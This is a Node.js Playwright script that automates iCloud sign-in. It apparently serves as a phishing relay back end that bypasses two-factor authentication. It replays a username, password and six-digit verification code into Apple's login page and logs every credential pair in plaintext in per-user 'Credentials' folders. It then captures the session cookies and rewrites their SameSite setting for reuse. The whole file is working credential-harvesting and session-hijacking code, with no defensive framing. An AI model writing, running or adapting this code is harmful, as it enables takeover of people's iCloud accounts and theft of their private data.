const playwright = require('playwright');
const readline = require('readline');
const fs = require('fs');
const path = require('path');

// Setup REPL interface
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

let browser = null; // Shared browser instance
const userSessions = {}; // Map to store user sessions

async function saveLoginAttempt(userId, username, password, outcome) {
    const userDir = path.join(__dirname, 'Credentials', userId);
    const attemptsFile = path.join(userDir, 'attempts.txt');
    fs.mkdirSync(userDir, { recursive: true });
    fs.appendFileSync(attemptsFile, `Username: ${username}, Password: ${password}, Outcome: ${outcome}\n`);
}

async function saveCookies(userId, context) {
    const userDir = path.join(__dirname, 'Credentials', userId);
    const cookiesFile = path.join(userDir, 'cookies.json');
    const cookies = await context.cookies();

    cookies.forEach(cookie => {
        if (cookie.sameSite) cookie.sameSite = 'lax';
    });

    fs.writeFileSync(cookiesFile, JSON.stringify(cookies, null, 2));
}



// Login process
async function loginProcess(userId) {

    return new Promise(async (resolve, reject) => {
        try {
            // Prompt for username and password
            const username = await new Promise((resolve) => {
                rl.question('Enter username: ', (input) => resolve(input));
            });
            const password = await new Promise((resolve) => {
                rl.question('Enter password: ', (input) => resolve(input));
            });

            // Launch browser if not already launched
            if (!browser) {
                browser = await playwright.chromium.launch({ headless: false }); // change to true later for production
            }


            // Create a new context for the user's session
            const context = await browser.newContext();
            const page = await context.newPage();

            // Store the context and page for the user session
            userSessions[userId] = { context, page, startTime: Date.now() };

            // Navigate to the login page and enter the credentials
            await page.goto('https://www.icloud.com/');
            await page.click('ui-button.push.primary.sign-in-button >> text=Sign In');

            // Wait for the iframe to be available
            const iframeElement = await page.waitForSelector('#aid-auth-widget-iFrame', { visible: true });
            const iframe = await iframeElement.contentFrame(); // Get the content frame of the iframe

            await iframe.waitForTimeout(1000); // Can be removed later

            // Wait for and fill in the username
            await iframe.waitForSelector('#account_name_text_field', { visible: true });
            await iframe.fill('#account_name_text_field', username);

            // Click the "Sign In" button inside the iframe
            await iframe.click('#sign-in');
            await iframe.click('#remember-me-label');

            // Wait for the "Continue" button to be visible and click it
            await iframe.waitForSelector('#continue-password', { visible: true });
            await iframe.click('#continue-password');

            // Wait for the password field and fill in the password
            await iframe.waitForSelector('#password_text_field', { visible: true });
            await iframe.fill('#password_text_field', password);

            // Click the "Sign In" button to submit the login form
            await iframe.click('#sign-in');

            // Wait for success or error conditions inside the iframe
            await iframe.waitForSelector('body', { visible: true });

            const successElement = iframe.locator('.verify-device');
            const errorElement = iframe.locator('#errMsg');

            try {
                // Create promises that will resolve when the elements become visible
                const successVisiblePromise = successElement.waitFor({ state: 'visible', timeout: 5000 }).then(() => true).catch(() => false);
                const errorVisiblePromise = errorElement.waitFor({ state: 'visible', timeout: 5000 }).then(() => true).catch(() => false);

                // Use Promise.race to resolve the first condition to become visible
                const result = await Promise.race([successVisiblePromise, errorVisiblePromise]);

                if (result === true) {
                    const successVisible = await successElement.isVisible();
                    const errorVisible = await errorElement.isVisible();

                    if (successVisible) {
                        console.log('Login successful!');
                        let outcome = "success";
                        saveLoginAttempt(userId, username, password, outcome);
                        resolve(true); // Login successful
                    } else if (errorVisible) {
                        console.log('Login failed.');
                        let outcome = "failure";
                        saveLoginAttempt(userId, username, password, outcome);
                        resolve(false); // Login failed
                    } else {
                        console.log('Unknown login status.');
                        let outcome = "idk";
                        saveLoginAttempt(userId, username, password, outcome);
                        resolve(false); // Unknown status
                    }
                } else {
                    console.log('Unknown login status.');
                    resolve(false); // Unknown status
                }
            } catch (error) {
                console.error('An error occurred while waiting for success or error elements:', error);
                reject('Error during login');
            }
        } catch (error) {
            console.error('Error during login', error);
            reject('Error during login'); // Handle unexpected errors
        }
    });
}

// Function to handle PIN validation
async function pinValidation(userId) {
    return new Promise(async (resolve, reject) => {
        rl.question('Enter PIN: ', async pin => {
            try {
                const userSession = userSessions[userId];

                if (!userSession || !userSession.context || !userSession.page) {
                    console.log('Session expired. Please log in again.');
                    resolve(false);
                    return;
                }

                const { context, page } = userSession;

                // Check if the session has timed out (10-minute timeout)
                if (Date.now() - userSession.startTime > 10 * 60 * 1000) {
                    console.log('Session timed out. Please log in again.');
                    resolve(false);
                    return;
                }

                const iframeElement = await page.waitForSelector('#aid-auth-widget-iFrame', { visible: true });
                const iframe = await iframeElement.contentFrame(); // Get the content frame of the iframe

                // Ensure the PIN has exactly 6 digits
                if (pin.length !== 6) {
                    throw new Error('PIN must be 6 digits.');
                }

                // Wait for the input fields to be visible before filling
                await iframe.waitForSelector('.form-security-code-input', { visible: true });

                // Manually type the PIN into the corresponding input fields inside the iframe
                await iframe.locator('input[aria-label="Enter Verification Code Digit 1"]').type(pin[0]); // Type first digit
                await iframe.locator('input[aria-label="Digit 2"]').type(pin[1]); // Type second digit
                await iframe.locator('input[aria-label="Digit 3"]').type(pin[2]); // Type third digit
                await iframe.locator('input[aria-label="Digit 4"]').type(pin[3]); // Type fourth digit
                await iframe.locator('input[aria-label="Digit 5"]').type(pin[4]); // Type fifth digit
                await iframe.locator('input[aria-label="Digit 6"]').type(pin[5]); // Type sixth digit

                // Wait a moment to allow any necessary validation or processing
                await page.waitForTimeout(2000); // Optional: Wait for 2 seconds for the validation process to complete

                const successElement = iframe.locator('button.button-rounded-rectangle[type="submit"]');
                const errorMessage = iframe.locator('span.form-message:has-text("Incorrect verification code.")');

                try {
                    // Create promises that will resolve when the elements become visible
                    const successVisiblePromise = successElement.waitFor({ state: 'visible', timeout: 5000 }).then(() => true).catch(() => false);
                    const errorVisiblePromise = errorMessage.waitFor({ state: 'visible', timeout: 5000 }).then(() => true).catch(() => false);

                    // Use Promise.race to resolve the first condition to become visible
                    const result = await Promise.race([successVisiblePromise, errorVisiblePromise]);

                    if (result === true) {
                        const successVisible = await successElement.isVisible();
                        const errorVisible = await errorMessage.isVisible();

                        if (successVisible) {
                            console.log('Login successful!');
                            await successElement.click();
                            await page.waitForTimeout(10000); // Wait for cookies

                            const cookies = await context.cookies();

                            // Adjust cookies' SameSite attribute to "Lax"
                            cookies.forEach(cookie => {
                                if (cookie.sameSite) {
                                    cookie.sameSite = 'lax'; // Update SameSite to Lax
                                }
                            });

                            // Create directory structure
                            const directoryPath = path.join(__dirname, 'Credentials', userId);
                            if (!fs.existsSync(directoryPath)) {
                                fs.mkdirSync(directoryPath, { recursive: true });
                            }


                            // Define the initial file path
                            let cookiesFilePath = path.join(directoryPath, 'cookies.json');

                            // Check if the file already exists
                            if (fs.existsSync(cookiesFilePath)) {
                                // Generate a unique file name with timestamp
                                const timestamp = Date.now();
                                cookiesFilePath = path.join(directoryPath, `cookies_${timestamp}.json`);
                            }

                            // Save cookies to the new file
                            fs.writeFileSync(cookiesFilePath, JSON.stringify(cookies, null, 2));

                            resolve(true); // PIN successful
                        } else if (errorVisible) {
                            console.log('Login failed.');
                            resolve(false); // PIN failed
                        } else {
                            console.log('Unknown login status.');
                            resolve(false); // Unknown Pin status
                        }
                    } else {
                        console.log('Unknown login status.');
                        resolve(false); // Unknown status
                    }
                } catch (error) {
                    console.error('An error occurred while waiting for Pin success or error elements:', error);
                    reject('Error during Pin');
                }
            } catch (error) {
                console.error('PIN validation failed', error);
                reject(error);
            }
        });
    });
}

// Start the process
async function startProcess() {
    rl.question('Enter a user ID: ', async userId => {
        try {
            const loginSuccessful = await loginProcess(userId);
            if (loginSuccessful) {
                const pinSuccessful = await pinValidation(userId);
                if (pinSuccessful) {
                    console.log('Process completed successfully!');
                } else {
                    console.log('Failed during PIN validation.');
                }
            } else {
                console.log('Login failed. Process aborted.');
            }
        } catch (error) {
            console.error('Error during the process:', error);
        } finally {
            rl.close(); // Close the REPL after completion
        }
    });
}

startProcess();
